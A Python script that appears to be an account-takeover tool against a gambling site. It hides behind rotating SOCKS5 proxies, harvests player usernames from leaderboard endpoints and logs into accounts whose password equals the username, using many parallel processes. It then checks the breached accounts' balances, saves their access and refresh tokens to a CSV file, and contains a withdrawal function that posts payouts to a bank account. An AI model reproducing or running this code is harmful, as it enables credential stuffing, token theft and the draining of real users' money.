import csv
from functools import partial
import multiprocessing
from operator import contains
from regex import U
import requests
import urllib.request
import imageio as iio
import os
import io
import pathlib
import mimetypes
import urllib3
from urllib.request import urlopen
import requests
from requests.structures import CaseInsensitiveDict
import json
import urllib.request
import sys
import codecs
import fitz
import re
import sys
import time
import telepot
from telepot.loop import MessageLoop
import pdb
import os
import sys
import shutil
from requests.structures import CaseInsensitiveDict
from multiprocessing import Pool

API_CHOICE = 3

if API_CHOICE == 1:
    API = "..."
if API_CHOICE == 2:
    API = "..."
if API_CHOICE == 3:
    API = "..."

APIKEY = 'KEY_OF PROXY'



def getNewProxy():
    resp = requests.get(f"https://api.tinproxy.com/proxy/get-new-proxy?api_key={APIKEY}&authen_ips=AUTHEN_IPS")
    print(resp.content)

def getCur():
    try:
        resp = requests.get(f"https://api.tinproxy.com/proxy/get-current-proxy?api_key={APIKEY}&authen_ips=AUTHEN_IPS")
        if (resp.status_code == 200):
            hey = resp.content
            decoded_data = codecs.decode(hey, 'utf-8')
            data = json.loads(decoded_data)
            print(data)

            if (data['data']['next_request'] == 0 or data['data']['next_request'] == "0"):
                try:
                    x = requests.get(f"https://api.tinproxy.com/proxy/get-new-proxy?api_key={APIKEY}&authen_ips=AUTHEN_IPS")
                    hey1 = x.content
                    decoded_data1 = codecs.decode(hey1, 'utf-8')
                    data1 = json.loads(decoded_data1)
                    print(data1)
                    
                    print(data1['data']['socks_ipv4'])
                    ip = data1['data']['socks_ipv4']
                    us = data1['data']['authentication']['username']
                    passw = data1['data']['authentication']['password']
                    #nonlocal connectStr_
                    print('--- new proxy')
                    newconnectStr_ = 'socks5://' + us + ':' + passw + '@' + ip
                    return newconnectStr_
                except Exception as e:
                    print("get new proxy")

            print(data['data']['socks_ipv4'])
            ip = data['data']['socks_ipv4']
            us = data['data']['authentication']['username']
            passw = data['data']['authentication']['password']
            #nonlocal connectStr_
            newconnectStr_ = 'socks5://' + us + ':' + passw + '@' + ip
            return newconnectStr_

    except Exception as e:
        print(e)

    

def withDraw(money, token, proxies):

    burp0_url = "https://{API}:443/paygate"
    burp0_headers = {"Connection": "close", "sec-ch-ua": "\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"", "Authorization": f"{token}", "Content-type": "application/x-www-form-urlencoded", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36", "sec-ch-ua-platform": "\"Windows\"", "Accept": "*/*", "Origin": "https://play.ku789.vin", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://play.ku789.vin/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5", "sec-gpc": "1"}
    burp0_data = {"command": "dt", "itemType": "5", "money": f"{money}", "bankId": f"{bankId}", "accountNumber": f"{accountNumber}", "accountName": f"{accountName}"}
    resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxies)
    if (resp.status_code == 200):
        hey = resp.content
        decoded_data = codecs.decode(hey, 'utf-8')
        data = json.loads(decoded_data)

        print(data['data']['message'])
               
def getUser(type, usernames, proxies):
    date = 1658933932077
    try:
        url = f"https://{API}/uamsExt?applicationId=14a5e5f3-2962-42f9-8a7c-fae36c4b9307&command=CMS_TOP&date={date}&topType=_{type}&desc=true&limit=10000"

        resp = requests.get(url, proxies=proxies)

        if (resp.status_code == 200):
            data = json.loads(resp.content)
            for x in data["data"]:
                if (not x["isBot"]):
                    usernames.append(x["username"]) if x["username"] not in usernames else usernames;
    except Exception as e:
        print("Error getUser")
        print(e)
    return usernames;
    

def login(username, proxies):
    password = username
    try:
        url = f"https://{API}/id?command=login2&username={username}&password={password}&platformId=4"

        resp = requests.get(url, proxies=proxies)
        if (resp.status_code == 200):
            hey = resp.content
            decoded_data = codecs.decode(hey, 'utf-8')
            data = json.loads(decoded_data)

            if (data['data']['message'] == "Thành công"):
                user = User(username, data['data']['accessToken'], data['data']['refreshToken'], 0, 0)
                print('Login success ' + username)
                return user;
    except:
        print("Error login")

def checkBalance(user, proxies):
    total = 0
    try:
        url = f"https://{API}/paygate?command=withdraw&money=1"

        headers = CaseInsensitiveDict()
        headers["Authorization"] = user.token

        resp = requests.get(url, headers=headers, proxies=proxies)
        if (resp.status_code == 200):
            hey = resp.content
            decoded_data = codecs.decode(hey, 'utf-8')
            data = json.loads(decoded_data)
            balanceTotal = data['data']['newBalance'] + data['data']['safe']
            if (balanceTotal > 0):
                user.balance = data['data']['newBalance']
                user.safe = data['data']['safe']
                total = user.balance + user.safe
                return user
    except Exception as e:
        print(e)
    return user    
 

def myFunc(e):
  return e['balance'] + e['safe']

def send(proxies):
    
    #auth = requests.auth.HTTPProxyAuth('c1h61dKC', 'LWo8mgjj')
    resp = requests.get("https://api.ipify.org?format=json", proxies=proxies)
    print(resp.content)
def main():

    processNumber = 50
    minBalance = 10000

    date = 1658933932077


    types = [100, 110, 199, 9, 202, 210, 209, 31, 33, 32, 217, 220, 219, 221, 205, 215, 35, 36, 0, 1, 206, 4, 8, 500, 310, 3, 2, 6]
    users = []
    usernames = []
    usernamesNotDup = set()
    
    strCon = getCur()
    #connectStr = "socks5://" + us + ":" + passw +"@" + ip
    proxies = {
        'http': strCon,
        'https': strCon
    }
    send(proxies)
    
    print('Starting get user')
    p1 = Pool(processes=processNumber)
    usernames = p1.map(partial(getUser, usernames=usernames, proxies=proxies),types)
    p1.close()
    p1.join()

    for username in usernames:
        usernamesNotDup.update(username)

    usernamesNotDup = list(filter(None, usernamesNotDup))
    print('End get user')
    print(f'Get success {len(usernamesNotDup)} username')   

    strCon = getCur()
    #connectStr = "socks5://" + us + ":" + passw +"@" + ip
    proxies = {
        'http': strCon,
        'https': strCon
    }
    send(proxies) 
    print('Starting login user')
    p2 = Pool(processes=processNumber)
    users = p2.map(partial(login, proxies=proxies), usernamesNotDup)
    p2.close()
    p2.join()
    print('End login user')
    users = list(set(users))
    users = list(filter(None, users))
    print(f"Login success to {len(users)} users")



    strCon = getCur()
    #connectStr = "socks5://" + us + ":" + passw +"@" + ip
    proxies = {
        'http': strCon,
        'https': strCon
    }
    send(proxies)
    print('Starting checkBalance user')
    p3 = Pool(processes=processNumber)
    result = p3.map(partial(checkBalance,proxies=proxies), users)
    p3.close()
    p3.join()
    print('End checkBalance user')
    result = list(set(result))
    result = list(filter(None, result))
    
    for item in result:
        if item is not None:
            if item.balance >= minBalance:
                print(f"{item.balance} - {item.safe} - {item.username} - {item.token}")
    try:
        with open("go789_5.csv", "a+") as stream:
            writer = csv.writer(stream)
            writer.writerows(users)
    except:
        print("Error save")

    # try:
    #    with open('ku789.txt', 'a+') as fp:
    #     for item in usernames:
    #         # write each item on a new line
    #         fp.write("%s\n" % item)
    #     print('Done')
    # except:
    #     print("Error save")

class User:
    def __init__(self, username, token, reToken, balance, safe):
        self.username = username
        self.token = token
        self.reToken = reToken
        self.balance = balance
        self.safe = safe

    def __repr__(self):
        return f"User({self.username!r}, {self.token!r}, {self.reToken!r}, {self.balance!r}, {self.safe!r})"

    def __iter__(self):
        return iter([self.username, self.token, self.reToken, self.balance, self.safe])

if __name__ == '__main__':
    main()